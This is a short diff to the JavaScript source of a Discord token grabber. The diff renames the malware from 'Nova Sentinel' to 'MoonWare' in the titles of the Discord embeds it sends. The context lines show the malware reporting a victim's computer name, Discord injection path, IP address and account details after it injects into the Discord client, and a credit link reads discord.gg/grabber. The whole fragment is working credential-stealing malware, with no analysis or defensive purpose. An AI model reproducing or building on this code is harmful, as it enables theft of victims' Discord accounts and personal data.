@@ -556,7 +556,7 @@ const FirstTime = async () => {
     var client_discord = appName;
     if (!token) {
       var params = await makeEmbed({
-        title: "<:nova:1132934190032244786> Nova Sentinel Initialized",
+        title: "<a:inject:1189417887371366442> MoonWare Initialized <a:inject:1189417887371366442>",
         fields: [
           {
             name: "Injection Info",
@@ -600,7 +600,7 @@ const FirstTime = async () => {
           `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
         ));
       var params = await makeEmbed({
-        title: "MoonWare Injected",
+        title: "<a:inject:1189417887371366442> MoonWare Injected <a:inject:1189417887371366442>",
         description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
         fields: [
           {
@@ -640,7 +640,7 @@ const FirstTime = async () => {
           },
           {
             name: "@Copyright",
-            value: `[Nova Sentinel 2023 <:nova:1132934190032244786>](https://discord.gg/grabber)`,
+            value: `[MoonWare 2023 <:moonware:1190369357428162600>](https://discord.gg/grabber)`,
             inline: !0,
           },
           {
